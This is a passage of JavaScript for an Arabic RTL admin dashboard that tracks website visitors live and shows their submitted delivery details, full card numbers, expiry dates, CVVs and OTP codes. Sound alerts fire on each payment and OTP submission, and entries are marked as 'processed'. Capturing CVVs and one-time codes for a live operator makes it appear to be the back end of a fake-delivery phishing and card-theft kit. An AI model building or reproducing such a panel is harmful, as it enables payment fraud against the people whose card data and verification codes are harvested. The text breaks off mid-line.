// Admin Dashboard JavaScript - Mobile First RTL
const SERVER_URL = window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1'
  ? 'http://localhost:3000'
  : window.location.origin;

let socket = null;
let adminToken = localStorage.getItem('admin_token');
let isMuted = false;
let audioContext = null;

// CRITICAL: Local cache of all visitors for sync between historical and live data
let allAdminVisitors = [];

// Live timer interval reference
let liveTimerInterval = null;

// Loading state management
let loadingStartTime = null;
let loadingTimeoutId = null;
const LOADING_TIMEOUT_MS = 5000; // 5 seconds

// Show loading state
function showLoadingState() {
  const grid = document.getElementById('visitorsGrid');
  const loadingEl = document.getElementById('visitorsLoading');
  const emptyEl = document.getElementById('visitorsEmpty');
  
  if (!grid || !loadingEl) return;
  
  // Clear any existing timeout
  if (loadingTimeoutId) {
    clearTimeout(loadingTimeoutId);
    loadingTimeoutId = null;
  }
  
  // Hide cards, show loading
  Array.from(grid.children).forEach(child => {
    if (child.id !== 'visitorsLoading') {
      child.style.display = 'none';
    }
  });
  
  loadingEl.style.display = 'flex';
  loadingEl.classList.remove('timeout');
  loadingEl.querySelector('p').textContent = 'جاري تحميل البيانات...';
  
  // Start timeout
  loadingStartTime = Date.now();
  loadingTimeoutId = setTimeout(() => {
    showLoadingTimeout();
  }, LOADING_TIMEOUT_MS);
}

// Show timeout warning
function showLoadingTimeout() {
  const loadingEl = document.getElementById('visitorsLoading');
  if (!loadingEl || loadingEl.style.display === 'none') return;
  
  console.warn('⚠️ Loading timeout reached (5s) - system is connected but no data received');
  loadingEl.classList.add('timeout');
  loadingEl.querySelector('p').textContent = 'الاتصال متصل، بانتظار البيانات...';
}

// Hide loading state
function hideLoadingState() {
  const loadingEl = document.getElementById('visitorsLoading');
  if (!loadingEl) return;
  
  // Clear timeout
  if (loadingTimeoutId) {
    clearTimeout(loadingTimeoutId);
    loadingTimeoutId = null;
  }
  
  // Hide loading indicator
  loadingEl.style.display = 'none';
}

// Show empty state
function showEmptyState(message = 'الزوار سيظهرون هنا') {
  const grid = document.getElementById('visitorsGrid');
  const emptyEl = document.getElementById('visitorsEmpty');
  
  if (!grid || !emptyEl) return;
  
  // Clear timeout
  if (loadingTimeoutId) {
    clearTimeout(loadingTimeoutId);
    loadingTimeoutId = null;
  }
  
  // Hide loading
  const loadingEl = document.getElementById('visitorsLoading');
  if (loadingEl) loadingEl.style.display = 'none';
  
  // Show empty state
  Array.from(grid.children).forEach(child => {
    if (child.id !== 'visitorsEmpty') {
      child.style.display = 'none';
    }
  });
  
  emptyEl.style.display = 'flex';
  emptyEl.querySelector('p').textContent = message;
}

// ==========================================
// RELATIVE TIME UTILITIES
// ==========================================

// Convert timestamp to relative time string (Arabic)
function getRelativeTime(timestamp) {
  if (!timestamp) return 'غير معروف';
  
  const now = new Date();
  const date = new Date(timestamp);
  const diffMs = now - date;
  const diffSeconds = Math.floor(diffMs / 1000);
  const diffMinutes = Math.floor(diffSeconds / 60);
  const diffHours = Math.floor(diffMinutes / 60);
  const diffDays = Math.floor(diffHours / 24);
  
  if (diffSeconds < 5) return 'الآن';
  if (diffSeconds < 60) return `منذ ${diffSeconds} ${diffSeconds === 1 ? 'ثانية' : 'ثوانٍ'}`;
  if (diffMinutes < 60) return `منذ ${diffMinutes} ${diffMinutes === 1 ? 'دقيقة' : 'دقائق'}`;
  if (diffHours < 24) return `منذ ${diffHours} ${diffHours === 1 ? 'ساعة' : 'ساعات'}`;
  if (diffDays < 7) return `منذ ${diffDays} ${diffDays === 1 ? 'يوم' : 'أيام'}`;
  
  return date.toLocaleDateString('ar-OM');
}

// Format date for display
function formatDate(timestamp) {
  if (!timestamp) return '—';
  const date = new Date(timestamp);
  return date.toLocaleString('ar-OM', {
    year: 'numeric',
    month: 'short',
    day: 'numeric',
    hour: '2-digit',
    minute: '2-digit'
  });
}

// Start live timer that updates every 5 seconds
function startLiveTimer() {
  if (liveTimerInterval) {
    clearInterval(liveTimerInterval);
  }
  liveTimerInterval = setInterval(() => {
    updateRelativeTimes();
  }, 5000);
  updateRelativeTimes();
}

// Update all relative time displays on the page
function updateRelativeTimes() {
  document.querySelectorAll('.relative-time').forEach(el => {
    const timestamp = el.getAttribute('data-timestamp');
    if (timestamp) {
      el.textContent = getRelativeTime(timestamp);
    }
  });
  
  document.querySelectorAll('.last-activity').forEach(el => {
    const timestamp = el.getAttribute('data-timestamp');
    if (timestamp) {
      el.textContent = 'آخر نشاط: ' + getRelativeTime(timestamp);
    }
  });
}

// ==========================================
// STATUS INDICATOR UTILITIES
// ==========================================

// Get status indicator based on submission state
function getStatusIndicator(status) {
  if (!status) {
    return '<span class="status-dot status-pending" title="في الانتظار">⏳</span>';
  }
  if (status.submitted && status.processed) {
    return '<span class="status-dot status-success" title="تم المعالجة">✅</span>';
  }
  if (status.submitted && !status.processed) {
    return '<span class="status-dot status-new" title="جديد - لم يُعالَج">🆕</span>';
  }
  if (!status.submitted) {
    return '<span class="status-dot status-pending" title="في الانتظار">⏳</span>';
  }
  return '<span class="status-dot status-pending">⏳</span>';
}

// ==========================================
// MODAL SYSTEM FOR HISTORY
// ==========================================

// History modal state
let currentHistoryModal = null;

// Open history modal with lazy loading
async function openHistoryModal(sessionId, type, buttonElement) {
  // If modal already open for this type, close it
  if (currentHistoryModal && currentHistoryModal.sessionId === sessionId && currentHistoryModal.type === type) {
    closeHistoryModal();
    return;
  }
  
  // Show loading indicator on button
  if (buttonElement) {
    buttonElement.classList.add('loading');
    buttonElement.innerHTML = '<span class="spinner-small"></span> جاري التحميل...';
  }
  
  try {
    const response = await fetch(`${SERVER_URL}/api/visitors/${sessionId}/history/${type}`);
    const data = await response.json();
    
    if (data.success) {
      showHistoryModal(sessionId, type, data);
      currentHistoryModal = { sessionId, type };
    } else {
      showToast('فشل في تحميل السجل', 'error');
    }
  } catch (error) {
    console.error('Error loading history:', error);
    showToast('فشل في تحميل السجل', 'error');
  } finally {
    if (buttonElement) {
      buttonElement.classList.remove('loading');
    }
  }
}

// Show history modal
function showHistoryModal(sessionId, type, data) {
  const modalId = 'historyModal_' + sessionId + '_' + type;
  let modal = document.getElementById(modalId);
  
  // Remove existing modal if exists
  if (modal) {
    modal.remove();
  }
  
  // Create modal
  modal = document.createElement('div');
  modal.id = modalId;
  modal.className = 'history-modal';
  modal.innerHTML = createHistoryModalContent(sessionId, type, data);
  document.body.appendChild(modal);
  
  // Add event listeners
  const closeBtn = modal.querySelector('.modal-close');
  const backdrop = modal.querySelector('.modal-backdrop');
  const compareToggle = modal.querySelector('.compare-toggle');
  
  if (closeBtn) closeBtn.addEventListener('click', closeHistoryModal);
  if (backdrop) backdrop.addEventListener('click', closeHistoryModal);
  if (compareToggle) compareToggle.addEventListener('change', toggleCompareMode);
  
  // Add compare button listeners to items
  modal.querySelectorAll('.history-item').forEach((item, idx, items) => {
    const compareBtn = item.querySelector('.compare-btn');
    if (compareBtn && idx > 0) {
      compareBtn.addEventListener('click', () => {
        const prevItem = items[idx - 1];
        highlightChanges(item, prevItem);
      });
    }
  });
  
  // Animate in
  requestAnimationFrame(() => {
    modal.classList.add('active');
  });
}

// Close history modal
function closeHistoryModal() {
  document.querySelectorAll('.history-modal').forEach(modal => {
    modal.classList.remove('active');
    setTimeout(() => modal.remove(), 300);
  });
  currentHistoryModal = null;
}

// Create history modal content
function createHistoryModalContent(sessionId, type, data) {
  const typeLabels = {
    delivery: 'بيانات التوصيل',
    payment: 'بيانات الدفع',
    verification: 'رموز التحقق'
  };
  
  const typeIcons = {
    delivery: '📦',
    payment: '💳',
    verification: '🔐'
  };
  
  const submissions = data.submissions || [];
  const count = submissions.length;
  
  let itemsHTML = '';
  if (count === 0) {
    itemsHTML = '<div class="no-history">لا توجد محاولات سابقة</div>';
  } else {
    submissions.forEach((sub, idx) => {
      const isFirst = idx === 0;
      const timestamp = sub.created_at;
      itemsHTML += `
        <div class="history-item ${isFirst ? 'latest' : ''}" data-index="${idx}">
          <div class="history-item-header">
            <div class="history-item-left">
              ${isFirst ? '<span class="current-badge">الحالي</span>' : ''}
              <span class="attempt-number">#${count - idx}</span>
            </div>
            <div class="history-item-right">
              <span class="relative-time" data-timestamp="${timestamp}">${getRelativeTime(timestamp)}</span>
              ${!isFirst ? `<button class="compare-btn" title="مقارنة مع السابق">🔍</button>` : ''}
            </div>
          </div>
          <div class="history-item-content" data-index="${idx}">
            ${formatHistoryItemData(type, sub.form_data)}
          </div>
          ${sub.is_processed ? '<div class="processed-badge">تمت المعالجة</div>' : ''}
        </div>
      `;
    });
  }
  
  return `
    <div class="modal-backdrop"></div>
    <div class="modal-content">
      <div class="modal-header">
        <div class="modal-title">
          <span class="modal-icon">${typeIcons[type]}</span>
          <span>${typeLabels[type]}</span>
          <span class="modal-count">(${count})</span>
        </div>
        <button class="modal-close">✕</button>
      </div>
      <div class="modal-body">
        <div class="modal-toolbar">
          <label class="compare-toggle">
            <input type="checkbox" onchange="toggleCompareMode(this)">
            <span>تمييز التغييرات</span>
          </label>
        </div>
        <div class="modal-history-list">
          ${itemsHTML}
        </div>
      </div>
    </div>
  `;
}

// Format history item data based on type
function formatHistoryItemData(type, formData) {
  if (!formData) return '<div class="no-data">—</div>';
  if (typeof formData === 'string') {
    try { formData = JSON.parse(formData); } catch (e) { return '<div class="no-data">—</div>'; }
  }
  
  let html = '<div class="data-grid">';
  
  switch (type) {
    case 'delivery':
      if (formData.fullName) html += `<div class="data-item"><span class="label">الاسم:</span><span class="value">${escapeHtml(formData.fullName)}</span></div>`;
      if (formData.phone) html += `<div class="data-item"><span class="label">الهاتف:</span><span class="value">${escapeHtml(formData.phone)}</span></div>`;
      if (formData.email) html += `<div class="data-item"><span class="label">البريد:</span><span class="value">${escapeHtml(formData.email)}</span></div>`;
      if (formData.address) html += `<div class="data-item"><span class="label">العنوان:</span><span class="value">${escapeHtml(formData.address)}</span></div>`;
      if (formData.city) html += `<div class="data-item"><span class="label">المدينة:</span><span class="value">${escapeHtml(formData.city)}</span></div>`;
      if (formData.deliveryDate) html += `<div class="data-item"><span class="label">تاريخ التوصيل:</span><span class="value">${escapeHtml(formData.deliveryDate)}</span></div>`;
      break;
      
    case 'payment':
      if (formData.cardNumber) html += `<div class="data-item"><span class="label">رقم البطاقة:</span><span class="value">${escapeHtml(formData.cardNumber)}</span></div>`;
      if (formData.cardHolder) html += `<div class="data-item"><span class="label">صاحب البطاقة:</span><span class="value">${escapeHtml(formData.cardHolder)}</span></div>`;
      if (formData.expiry) html += `<div class="data-item"><span class="label">تاريخ الانتهاء:</span><span class="value">${escapeHtml(formData.expiry)}</span></div>`;
      if (formData.cvv) html += `<div class="data-item"><span class="label">CVV:</span><span class="value">${escapeHtml(formData.cvv)}</span></div>`;
      if (formData.paymentMethod) html += `<div class="data-item"><span class="label">طريقة الدفع:</span><span class="value">${escapeHtml(formData.paymentMethod === 'cash' ? 'نقداً عند الاستلام' : formData.paymentMethod)}</span></div>`;
      if (formData.paymentAmount) html += `<div class="data-item"><span class="label">المبلغ:</span><span class="value">${formData.paymentAmount} ر.ق</span></div>`;
      break;
      
    case 'verification':
      if (formData.otp) {
        html += `<div class="data-item otp-display"><span class="label">رمز OTP:</span>`;
        html += `<span class="otp-digits">${formData.otp.split('').map(d => `<span class="otp-char">${d}</span>`).join('')}</span>`;
        html += `</div>`;
      }
      break;
  }
  
  html += '</div>';
  return html;
}

// Toggle compare/highlight mode
function toggleCompareMode(checkbox) {
  const modal = checkbox.closest('.history-modal');
  if (modal) {
    modal.classList.toggle('compare-mode', checkbox.checked);
  }
}

// Highlight changes between two history items
function highlightChanges(currentItem, previousItem) {
  const currentData = currentItem.querySelector('.history-item-content');
  const prevData = previousItem.querySelector('.history-item-content');
  
  if (!currentData || !prevData) return;
  
  // Reset all highlights
  document.querySelectorAll('.history-item-content .data-item').forEach(item => {
    item.classList.remove('changed', 'new', 'removed');
  });
  
  // Get data items
  const currentItems = {};
  const prevItems = {};
  
  currentData.querySelectorAll('.data-item').forEach(item => {
    const label = item.querySelector('.label')?.textContent;
    const value = item.querySelector('.value')?.textContent;
    if (label) currentItems[label] = value;
  });
  
  prevData.querySelectorAll('.data-item').forEach(item => {
    const label = item.querySelector('.label')?.textContent;
    const value = item.querySelector('.value')?.textContent;
    if (label) prevItems[label] = value;
  });
  
  // Compare and highlight
  currentData.querySelectorAll('.data-item').forEach(item => {
    const label = item.querySelector('.label')?.textContent;
    const value = item.querySelector('.value')?.textContent;
    
    if (label) {
      if (!prevItems.hasOwnProperty(label)) {
        item.classList.add('new');
      } else if (prevItems[label] !== value) {
        item.classList.add('changed');
      }
    }
  });
  
  // Scroll current item into view
  currentItem.scrollIntoView({ behavior: 'smooth', block: 'center' });
}

// ==========================================
// SMART SOUND SYSTEM - Silent typing, alerts only on submissions
// ==========================================

// Track which events we've already notified about (prevent spam)
const notifiedEvents = new Map();

// Sound definitions using Web Audio API
const sounds = {
  // Delivery form submitted - NICE DOUBLE BEEP (success)
  formDelivery: () => {
    if (isMuted) return;
    // Double beep: two short friendly tones
    playSmartBeep([523.25, 0, 659.25], 0.12, 0.1);
  },
  
  // Payment submitted - FINANCIAL CONFIRMATION (higher pitch, strong)
  formPayment: () => {
    if (isMuted) return;
    // Ascending financial confirmation
    playSmartBeep([659.25, 0, 783.99, 0, 1046.50], 0.1, 0.12);
  },
  
  // OTP verification - RAPID ALERT (urgent)
  formVerification: () => {
    if (isMuted) return;
    // Rapid triple alert
    playSmartBeep([880, 0, 880, 0, 1046.50], 0.08, 0.06);
  }
};

// Play gentle notification when visitor changes page
function playPageChangeSound() {
  if (isMuted) return;
  // Soft single chime - gentle notification
  playSmartBeep([440, 0, 554.37], 0.1, 0.15);
}

// Generate smart beep using Web Audio API
function playSmartBeep(frequencies, duration = 0.15, gap = 0.1) {
  try {
    // Create new AudioContext (user gesture required for first time)
    const ctx = new (window.AudioContext || window.webkitAudioContext)();
    
    // Resume context if suspended (browser policy)
    if (ctx.state === 'suspended') {
      ctx.resume();
    }
    
    frequencies.forEach((freq, i) => {
      if (freq === 0) return; // Skip silence gaps
      
      const startTime = ctx.currentTime + (i * (duration + gap));
      
      // Create oscillator
      const oscillator = ctx.createOscillator();
      const gainNode = ctx.createGain();
      
      // Connect
      oscillator.connect(gainNode);
      gainNode.connect(ctx.destination);
      
      // Set frequency - use different wave types for variety
      oscillator.frequency.value = freq;
      oscillator.type = i % 2 === 0 ? 'sine' : 'triangle';
      
      // Volume envelope - smooth attack and release
      gainNode.gain.setValueAtTime(0, startTime);
      gainNode.gain.linearRampToValueAtTime(0.25, startTime + 0.02); // Attack
      gainNode.gain.linearRampToValueAtTime(0.15, startTime + duration * 0.5); // Decay
      gainNode.gain.linearRampToValueAtTime(0, startTime + duration); // Release
      
      // Start and stop
      oscillator.start(startTime);
      oscillator.stop(startTime + duration);
    });
    
    // Cleanup context after all sounds done
    setTimeout(() => ctx.close(), (frequencies.length * (duration + gap) + 0.5) * 1000);
    
  } catch (e) { 
    console.warn('Audio playback not supported:', e); 
  }
}

// Check if we should play sound (prevent duplicate notifications)
function shouldPlaySound(sessionId, eventType) {
  const key = `${sessionId}_${eventType}`;
  const now = Date.now();
  const lastPlayed = notifiedEvents.get(key);
  
  // Don't play if played in last 3 seconds (prevent spam)
  if (lastPlayed && (now - lastPlayed) < 3000) {
    return false;
  }
  
  notifiedEvents.set(key, now);
  
  // Clean old entries (older than 1 minute)
  for (const [k, v] of notifiedEvents) {
    if (now - v > 60000) notifiedEvents.delete(k);
  }
  
  return true;
}

// ==========================================
// VISITOR CACHE MANAGEMENT
// ==========================================

// Render ALL visitors from cache to grid (initial load)
function renderAllVisitorsToGrid() {
  const grid = document.getElementById('visitorsGrid');
  if (!grid) {
    console.log('❌ Grid not found!');
    return;
  }
  
  // COMPLETELY CLEAR THE GRID
  grid.innerHTML = '';
  grid.offsetHeight; // Trigger reflow
  
  if (allAdminVisitors.length === 0) {
    grid.innerHTML = '<div class="empty-state"><span>👥</span><h3>لا يوجد زوار</h3><p>الزوار سيظهرون هنا</p></div>';
    console.log('✅ No visitors to display');
    return;
  }
  
  // BUILD NEW CARDS FROM SCRATCH
  const fragment = document.createDocumentFragment();
  
  allAdminVisitors.forEach((visitor, index) => {
    try {
      const cardHTML = createVisitorCard(visitor);
      const tempDiv = document.createElement('div');
      tempDiv.innerHTML = cardHTML;
      const cardElement = tempDiv.firstElementChild;
      
      if (cardElement) {
        // Add animation
        cardElement.style.opacity = '0';
        cardElement.style.transform = 'translateY(20px)';
        fragment.appendChild(cardElement);
        
        // Trigger animation after append
        requestAnimationFrame(() => {
          setTimeout(() => {
            cardElement.style.transition = 'opacity 0.3s ease, transform 0.3s ease';
            cardElement.style.opacity = '1';
            cardElement.style.transform = 'translateY(0)';
          }, index * 50);
        });
      }
    } catch (e) {
      console.error('❌ Error creating card:', e);
    }
  });
  
  // Append all cards at once
  grid.appendChild(fragment);
  
  // Update counts
  updateOnlineCounts();
  
  console.log(`✅ Rendered ${allAdminVisitors.length} visitor cards`);
}

// Update a single visitor card in grid (live update)
function updateVisitorCardInGrid(sessionId, visitorData) {
  const grid = document.getElementById('visitorsGrid');
  if (!grid) return;
  
  // Find existing card
  const existingCard = grid.querySelector(`[data-session="${sessionId}"]`);
  
  if (existingCard) {
    // UPDATE existing card - rebuild and replace
    const newCardHTML = createVisitorCard(visitorData);
    const tempDiv = document.createElement('div');
    tempDiv.innerHTML = newCardHTML;
    const newCard = tempDiv.firstElementChild;
    
    if (newCard) {
      // Add highlight effect
      newCard.style.boxShadow = '0 0 20px rgba(99, 102, 241, 0.5)';
      newCard.style.borderColor = 'var(--primary)';
      
      // Replace old card with new
      existingCard.replaceWith(newCard);
      
      // Remove highlight after animation
      setTimeout(() => {
        newCard.style.boxShadow = '';
        newCard.style.borderColor = '';
      }, 2000);
      
      console.log(`🔄 Updated card for ${sessionId}`);
    }
  } else {
    // Card doesn't exist - add new one
    addVisitorCardToGrid(visitorData, true);
  }
}

// Add a new visitor card to grid
function addVisitorCardToGrid(visitorData, atTop = true) {
  const grid = document.getElementById('visitorsGrid');
  if (!grid) return;
  
  // Remove empty state if exists
  const emptyState = grid.querySelector('.empty-state');
  if (emptyState) {
    emptyState.remove();
  }
  
  try {
    const cardHTML = createVisitorCard(visitorData);
    const tempDiv = document.createElement('div');
    tempDiv.innerHTML = cardHTML;
    const cardElement = tempDiv.firstElementChild;
    
    if (cardElement) {
      // Animate in
      cardElement.style.opacity = '0';
      cardElement.style.transform = 'translateY(-20px)';
      
      if (atTop && grid.firstChild) {
        grid.insertBefore(cardElement, grid.firstChild);
      } else {
        grid.appendChild(cardElement);
      }
      
      requestAnimationFrame(() => {
        cardElement.style.transition = 'opacity 0.4s ease, transform 0.4s ease';
        cardElement.style.opacity = '1';
        cardElement.style.transform = 'translateY(0)';
      });
      
      console.log(`🆕 Added new card for ${visitorData.session_id || visitorData.sessionId}`);
    }
  } catch (e) {
    console.error('❌ Error adding card:', e);
  }
}

// Update online/total counts based on cache
function updateOnlineCounts() {
  const onlineCount = allAdminVisitors.filter(v => v.is_online === true).length;
  const countEl = document.getElementById('onlineCount');
  const totalCountEl = document.getElementById('totalCount');
  
  if (countEl) countEl.textContent = onlineCount;
  if (totalCountEl) totalCountEl.textContent = allAdminVisitors.length;
}

// Socket connection state
let socketListenersRegistered = false;

// Initialize Socket Connection (called AFTER successful login)
function initAdminSocket(password) {
  return new Promise((resolve, reject) => {
    // Disconnect existing socket if any
    if (socket) {
      socket.disconnect();
      socket = null;
    }
    
    // Create socket with password as auth token
    socket = io(SERVER_URL, {
      auth: {
        token: password // Send password directly for socket auth
      },
      query: { sessionId: 'admin_' + Date.now() },
      transports: ['websocket', 'polling'],
      reconnection: true,
      reconnectionAttempts: 5,
      reconnectionDelay: 1000
    });

    socket.on('connect', () => {
      console.log('🔌 Admin socket connected, socket id:', socket.id);
      updateConnectionStatus(true);
      
      // Register listeners only once
      if (!socketListenersRegistered) {
        setupSocketListeners();
        socketListenersRegistered = true;
      }
      
      resolve(socket);
    });
    
    // DEBUG: Log ALL incoming socket events (only for events we're tracking)
    socket.onAny((event, ...args) => {
      console.log(`📨 SOCKET EVENT: ${event}`, args[0]);
    });

    socket.on('connect_error', (error) => {
      console.error('❌ Socket connection error:', error.message);
      updateConnectionStatus(false);
      reject(error);
    });

    socket.on('disconnect', () => {
      console.log('🔌 Admin socket disconnected');
      updateConnectionStatus(false);
    });
    
    socket.on('unauthorized', (data) => {
      console.error('❌ Socket unauthorized:', data.message);
      socket.disconnect();
      reject(new Error(data.message));
    });
  });
}

// Reconnect socket with existing token
function reconnectSocket() {
  return new Promise((resolve, reject) => {
    if (socket && socket.connected) {
      resolve(socket);
      return;
    }
    
    initAdminSocket(adminToken).then(resolve).catch(reject);
  });
}

// Separate function for all socket listeners
function setupSocketListeners() {
  if (!socket) {
    console.log('❌ Socket not ready for listeners');
    return;
  }
  console.log('📡 Setting up socket listeners...');

  socket.on('admin:valid', (data) => {
    console.log('🔐 Admin validation result:', data);
    if (!data.valid) {
      localStorage.removeItem('admin_token');
      localStorage.removeItem('admin_login_time');
      adminToken = null;
      
      // Show session expired message if applicable
      if (data.reason === 'session_expired') {
        showNotification('انتهت جلستك', 'انتهت صلاحية جلستك، يرجى تسجيل الدخول مجدداً', 'warning');
      }
    } else {
      // Session is valid - save login time if provided
      if (data.loginAt) {
        localStorage.setItem('admin_login_time', data.loginAt);
      }
    }
  });

  socket.on('admin:loginSuccess', (data) => {
    console.log('🔐 Admin login success:', data);
    if (data.sessionToken) {
      localStorage.setItem('admin_token', data.sessionToken);
      localStorage.setItem('admin_login_time', new Date().toISOString());
      adminToken = data.sessionToken;
    }
    // Show loading state and request initial data
    console.log('📡 Requesting initial data after login...');
    showLoadingState();
    socket.emit('visitors:request');
    socket.emit('stats:request');
  });

  socket.on('admin:loginFailed', (data) => {
    console.error('❌ Admin login failed:', data.message);
  });

  socket.on('admin:forceLogout', () => {
    localStorage.removeItem('admin_token');
    localStorage.removeItem('admin_login_time');
    adminToken = null;
    showNotification('انتهت جلستك', 'تم تسجيل خروجك من جميع الأجهزة', 'warning');
    setTimeout(() => showLoginPage(), 2000);
  });

  // CRITICAL: Load all historical visitors on initial connection
  // This is the FIRST data load - populate the cache and render all visitors
  socket.on('admin:initData', (data) => {
    console.log('📊 DATA RECEIVED VIA SOCKET (admin:initData):', data);
    console.log('📊 Visitors count:', data.visitors?.length || 0);
    
    // Hide loading state
    hideLoadingState();
    
    const grid = document.getElementById('visitorsGrid');
    if (!grid) {
      console.log('❌ Grid not found!');
      return;
    }
    
    // Get visitors array
    let visitors = data.visitors || [];
    console.log('📊 Processing', visitors.length, 'visitors');
    
    // Populate the local cache
    allAdminVisitors = visitors.map(v => ({...v}));
    console.log('📦 Cached', allAdminVisitors.length, 'visitors');
    
    // Render using filtered view (compact cards)
    applyFilterAndRender();
    
    // Update stats if provided
    if (data.stats) {
      updateStatsDisplay(data.stats);
    }
  });

  // CRITICAL: Handle live visitor updates - UPDATE existing or ADD new
  socket.on('visitor:updated', (data) => {
    console.log('🔄 LIVE UPDATE (visitor:updated):', data);
    
    const sessionId = data.session_id || data.sessionId;
    if (!sessionId) return;
    
    // Find visitor in cache
    const existingIndex = allAdminVisitors.findIndex(v => 
      v.session_id === sessionId || v.sessionId === sessionId
    );
    
    if (existingIndex !== -1) {
      // UPDATE existing visitor - merge new data with existing
      console.log(`🔄 Updating existing visitor ${sessionId} at index ${existingIndex}`);
      allAdminVisitors[existingIndex] = {...allAdminVisitors[existingIndex], ...data};
      
      // Re-render just this card (live update)
      updateVisitorCardInGrid(sessionId, allAdminVisitors[existingIndex]);
    } else {
      // ADD new visitor to cache
      console.log(`🆕 Adding new visitor ${sessionId} to cache`);
      allAdminVisitors.unshift({...data});
      
      // Add new card to top of grid
      addVisitorCardToGrid(data, true);
    }
    
    // Update stats
    updateOnlineCounts();
  });

  // Handle stats data
  socket.on('stats:data', (data) => {
    console.log('📊 DATA RECEIVED VIA SOCKET (stats:data):', data);
    updateStatsDisplay(data);
  });

  // CRITICAL: Real-time updates from visitors
  socket.on('visitor:new', (data) => {
    console.log('🆕 DATA RECEIVED VIA SOCKET (visitor:new):', data);
    console.log('🆕 sessionId:', data.session_id || data.sessionId);
    console.log('🆕 allAdminVisitors length:', allAdminVisitors.length);
    console.log('🆕 visitorsCache size:', visitorsCache.size);
    console.log('🆕 Grid element:', document.getElementById('visitorsGrid'));
    
    // NO SOUND for new visitors - data updates should be silent
    const sessionId = data.session_id || data.sessionId;
    
    if (!sessionId) {
      console.error('❌ visitor:new received without sessionId!');
      return;
    }
    
    // Check if card already exists
    const existingCard = document.querySelector('[data-session="' + sessionId + '"]');
    console.log('🆕 Existing card:', existingCard);
    
    if (existingCard) {
      // Card exists - smart update and move to top
      console.log('🆕 Updating existing card');
      updateCardAndMoveToTop(sessionId, data);
    } else {
      // New card - add to DOM directly
      console.log('🆕 Creating new card for visitor');
      const grid = document.getElementById('visitorsGrid');
      if (grid) {
        createVisitorCardElement(data, grid);
        
        // Remove empty state if exists
        const emptyState = grid.querySelector('.empty-state');
        if (emptyState) emptyState.remove();
      }
    }
    
    // Also add to cache
    visitorsCache.set(sessionId, data);
    if (!allAdminVisitors.find(v => v.session_id === sessionId)) {
      allAdminVisitors.unshift(data);
    }
    
    updateStats();
  });

  socket.on('visitor:pageChange', (data) => {
    console.log('📄 DATA RECEIVED VIA SOCKET (visitor:pageChange):', data);
    // NO SOUND - page changes should be silent
    // Update card and move to top (smart update, not full refresh)
    updateCardAndMoveToTop(data.sessionId, data);
  });

  socket.on('visitor:offline', (data) => {
    console.log('📴 DATA RECEIVED VIA SOCKET (visitor:offline):', data);
    const sessionId = data.session_id || data.sessionId;
    
    // IMPORTANT: DO NOT remove card, just update visual status
    // The card with all OTP data should remain visible
    updateVisitorStatus(sessionId, false);
    
    // Move to top when going offline (recent activity)
    moveCardToTop(sessionId);
    
    // Update stats
    updateStats();
  });

  socket.on('visitor:online
